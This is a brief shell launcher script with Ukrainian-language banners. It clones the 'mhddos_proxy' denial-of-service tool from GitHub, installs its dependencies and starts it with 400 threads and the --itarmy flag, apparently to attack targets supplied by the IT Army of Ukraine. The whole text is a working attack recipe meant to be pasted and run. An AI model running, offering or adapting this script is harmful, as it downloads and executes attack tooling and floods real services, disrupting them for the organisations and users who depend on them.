cd ~/ && rm -rf mhddos_proxy && 
git clone https://github.com/porthole-ascend-cinnamon/mhddos_proxy.git &&
cd mhddos_proxy && python3 -m pip install -r requirements.txt &&
pip install colorama tabulate aiohttp &&
echo -e "\033[1;44m     Україна вітає тебе друже!     \033[0m"; 
echo -e "\033[1;43m    Давай зробимо добру справу!    \033[0m"; 
tput setaf 6; tput bold; echo "Ініціюю  запуск  програми  MHDDoS_proxy";
sleep 6; ./runner.sh python3 -t 400 --itarmy --vpn
